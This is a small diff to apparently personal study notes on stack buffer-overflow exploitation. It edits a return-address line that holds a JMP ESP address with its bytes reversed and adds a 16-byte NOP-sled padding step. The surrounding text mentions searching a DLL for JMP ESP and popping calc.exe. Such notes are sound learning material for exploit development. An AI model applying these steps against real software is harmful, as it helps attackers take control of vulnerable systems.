@@ -228,7 +228,12 @@ Alternate method: on attack box, search DLL file for JMP ESP (\xff\xd4)
 Insert address into script as retn variable, with bytes flipped. 
 Ex.
 
-    retn = "\xdf\x14\x50\x62"      #0x625014df        
+    retn = "\xdf\x14\x50\x62"      #0x625014df       
+    
+Insert NOPs
+
+    padding = "\x90" * 16
+ 
 
     
 Popping calc.exe    
